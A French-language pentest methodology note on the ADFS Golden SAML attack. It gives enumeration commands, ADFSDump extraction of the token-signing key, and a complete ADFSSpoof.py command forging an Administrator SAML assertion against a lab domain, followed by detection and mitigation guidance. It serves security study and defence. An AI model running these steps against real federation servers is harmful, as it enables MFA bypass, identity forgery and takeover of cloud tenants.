L'**ADFS (Active Directory Federation Services)** est la solution de SSO (Single Sign-On) de Microsoft permettant d'étendre l'identité on-premise vers des services cloud (Office 365, AWS, Salesforce).

L'attaque principale est le **Golden SAML**. Contrairement aux attaques Kerberos qui visent l'AD local, le Golden SAML permet de forger des jetons d'authentification valides pour n'importe quel service fédéré, **en contournant totalement le MFA** (car le MFA est vérifié _avant_ la génération du jeton).

Le pivot de cette attaque est le certificat de signature de jetons (**Token Signing Certificate**).

**Le mécanisme en jeu (Fédération SAML) :**

1. **Confiance (Trust)** : Le fournisseur de service (ex: Office 365) fait confiance à l'ADFS. Cette confiance repose sur un certificat public.
    
2. **Signature** : L'ADFS signe les assertions SAML (XML) avec sa clé privée (`Token Signing Key`).
    
3. **Preuve** : Si un attaquant possède cette clé privée, il peut signer ses propres objets SAML. Le service cloud (Service Provider) ne peut pas faire la différence entre un jeton légitime et un jeton forgé.
    

## Détails de l'exploitation : Golden SAML

L'exploitation nécessite d'avoir compromis le serveur ADFS (ou d'être Admin du Domaine). L'objectif est d'exfiltrer le matériel cryptographique pour forger des tickets hors ligne.

### Prérequis

Contrairement au Golden Ticket qui nécessite le hash KRBTGT, le Golden SAML nécessite :

1. Le **Token Signing Certificate** et sa **clé privée**.
    
2. L'**ObjectGUID** (ou ImmutableID) de l'utilisateur cible.
    
3. Le nom du domaine de fédération (Issuer URI).
    

La clé privée est souvent stockée de manière chiffrée dans la base de données ADFS (WID ou SQL) et la clé de déchiffrement (DKM - Distributed Key Manager) se trouve dans un conteneur de l'AD.

## Énumération

L'objectif est d'identifier les serveurs ADFS et de récupérer les informations de configuration publique.

```powershell
# Identifier les serveurs ADFS via SPN
Get-NetUser -SPN "host/adfs*" | Select-Object Name, DistinguishedName

# Si on a un accès local sur un serveur ADFS
Get-AdfsProperties | Select-Object HostName, IdentifierUri
Get-AdfsCertificate -CertificateType Token-Signing
```

## Exploitation

Pour l'exploitation, nous devons avoir accès au compte de service ADFS, sur le serveur ADFS.
Utilisation de ADFSDump pour dumper le certificat et la clef privée:

```powershell
ADFSDump.exe
```

Conversion des données récupérées:

```bash
echo AAAAZEFIJZFEIJAE... | base64 -d > pfx.bin
echo EGEOKFIJR... | xxd -r -p > key.bin
```

Utilisation de ADFSSPoof pour la création du Golden SAML:

```bash
ADFSSpoof.py -b pfx.bin key.bin -s serveurADFS.lab.local --endpoint https://lab.local/adfs/ls/SamlesponseServlet --nameid 'lab.local\Administrator' --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
```

| Catégorie                    | Information                                                                                                                                                                                                                                                                                               |
| ---------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TTP**                      | T1606.002 (Forge Web Credentials: SAML Tokens)                                                                                                                                                                                                                                                            |
| **Description de l'attaque** | Vol du certificat de signature de jetons ADFS pour forger des assertions SAML arbitraires. Permet d'accéder à tout service fédéré (SaaS, IaaS) en se faisant passer pour n'importe qui.                                                                                                                   |
| **Impacts potentiels**       | - **Contournement total du MFA** (le fournisseur de service croit que le MFA a été validé par l'ADFS).<br><br>- Persistance à long terme (le certificat est valide des années).<br><br>- Accès Global Admin au Cloud (Azure, AWS, O365) depuis l'AD on-prem.                                              |
| **Comment la détecter**      | - Surveiller l'Event ID **1007** (Export de certificat) sur les serveurs ADFS.<br><br>- Surveiller les lectures sur le conteneur AD DKM (Container "ADFS" dans System).<br><br>- Corréler les logs : Une authentification O365 réussie sans event de login correspondant sur l'ADFS on-prem est suspecte. |
| **Remédiations/mitigations** | - Traiter les serveurs ADFS comme des **Tier 0** (équivalent Contrôleur de Domaine).<br><br>- Utiliser des HSM (Hardware Security Modules) pour stocker les clés privées (empêche l'export).<br><br>- Monitorer agressivement les accès au compte de service ADFS.                                        |
| **Lien de référence**        | [InternalAllTheThings - ADFS Golden SAML](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adfs-federation-services/#adfs-golden-saml "null")                                                                                                                                       |